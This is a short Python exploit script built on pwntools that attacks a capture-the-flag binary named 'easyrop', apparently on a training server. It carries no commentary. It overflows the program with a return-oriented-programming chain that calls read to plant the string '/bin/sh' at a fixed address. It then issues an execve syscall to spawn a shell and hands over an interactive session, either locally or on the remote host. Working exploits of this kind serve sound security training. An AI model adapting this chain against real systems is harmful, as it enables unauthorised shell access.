from pwn import *

CHALL_PATH = "./easyrop"
CHALL = ELF(CHALL_PATH)
COMMANDS = """
b *0x000000000040108e
c
"""

context.arch = "amd64"

SYSCALL = 0x0000000000401028
POP_RDI_RSI_RDX_RAX_RET = 0x000000000040108e
READ = 0x0000000000401000
BINSH = 0x403010


def send(data):
    half_1 = data & 0xffffffff
    half_2 = data >> 32
    p.send(p32(half_1))
    p.send(p32(0))
    p.send(p32(half_2))
    p.send(p32(0))

if args.GDB:
    p = gdb.debug(CHALL_PATH, COMMANDS)
    
elif args.REMOTE:
    p = remote('easyrop.training.offensivedefensive.it', 8080, ssl = True)
    
else:
    p = process(CHALL_PATH)

payload = [0x0] * 7
payload += [
    POP_RDI_RSI_RDX_RAX_RET,
    0x0,
    BINSH,
    0x8,
    0x0,
    READ,
    POP_RDI_RSI_RDX_RAX_RET,
    BINSH,
    0x0,
    0x0,
    0x3b,
    SYSCALL
]

p.recvuntil(b"Try easyROP!\n")

for i in payload:
    send(i)

p.send(b'\n')
time.sleep(0.1)
p.send(b'\n')
time.sleep(0.1)
p.send(b"/bin/sh\x00")

p.interactive()
